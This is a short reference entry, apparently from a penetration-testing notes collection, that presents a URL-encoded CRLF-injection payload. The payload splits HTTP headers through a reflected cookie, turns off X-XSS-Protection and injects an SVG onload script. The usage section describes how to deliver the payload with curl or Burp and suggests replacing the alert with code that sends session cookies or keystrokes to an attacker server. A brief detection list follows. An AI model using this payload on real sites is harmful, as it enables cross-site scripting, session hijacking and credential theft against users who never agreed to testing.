---
type: code
language: text
verified: true
platforms:
  - Web
tags:
  - crlf-injection
  - xss-payload
validated: true
---

# CRLF-Encoded-XSS-Payload

## Code

```text
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

## Description

This payload string is designed for injection into a cookie value that is reflected into HTTP response headers. It uses URL-encoded CRLF (%0d%0a) to split the header, injects a custom Content-Length and disables X-XSS-Protection, then adds a blank line to start the response body with an SVG-based XSS payload that alerts the document domain.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Content-Length | Size of the injected body (adjust to match payload length) | 35 |
| <svg onload=alert(document.domain)> | XSS payload (replace alert with exfiltration, e.g., fetch to attacker server) | <svg onload=alert(document.domain)> |

## Usage

Set this as the value for the reflected cookie in an HTTP request (e.g., via curl or Burp Repeater). Target endpoints where cookies are echoed into headers like Link or Location. Test in a browser to confirm XSS execution; in attacks, modify the onload to steal session cookies or keystrokes.

## Detection

- WAF rules for CRLF (%0d%0a) in cookie values or headers.
- Server logs showing anomalous Content-Length or X-XSS-Protection changes.
- Browser CSP violations or JavaScript execution from unexpected sources.
- Response body containing SVG tags outside normal HTML structure.

## Related

- [[procedures/CRLF-Cookie-Injection-for-XSS-Bypass]]
- [[commands/curl-send-crlf-cookie]]
